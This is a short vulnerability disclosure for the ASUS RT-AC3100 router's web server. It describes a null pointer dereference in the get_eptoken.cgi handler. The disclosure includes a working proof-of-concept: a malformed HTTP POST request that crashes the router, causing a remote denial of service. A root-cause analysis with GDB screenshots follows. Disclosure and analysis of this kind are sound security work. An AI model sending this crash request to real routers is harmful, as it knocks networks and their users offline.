# ASUS AC3100 get_eptoken.cgi null pointer dereference

In ASUS [AC3100 3.0.0.4.386_48263](https://dlsvr04.asus.com.cn/pub/ASUS/wireless/RT-AC3100/FW_RT_AC3100_300438648263.zip?model=RT-AC3100) router's  `/usr/sbin/httpd`, There is a null pointer dereference vulnerability. Which affects the latest version of this router before 2024/2/11.

Null Pointer Deference will cause the deny of service(DoS) attack by a remote attacker.

## POC

```shell
POST /get_eptoken.cgi*h:
Aut$=^M
Content-Length: 93^M
^M
1*u%*Host: 1u%*u%*u%*u%rlucezXio                ?                                   o_çaaa++++E^[cywzyzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzy
S
A^M
Co
```

## Analysis

After sending the POC, The router crashes with segment fault. Below is the crash point in GDB, the register r0 is zero, which causes segment fault.

![image-20240211184547994](AC3100_get_eptoken.cgi/image-20240211184547994.png)

After analyzing the root cause, the router returns NULL in the function `json_object_get_object`,  which will cause Null-Pointer-Dereference in the following code.

![image-20240211184830999](AC3100_get_eptoken.cgi/image-20240211184830999.png)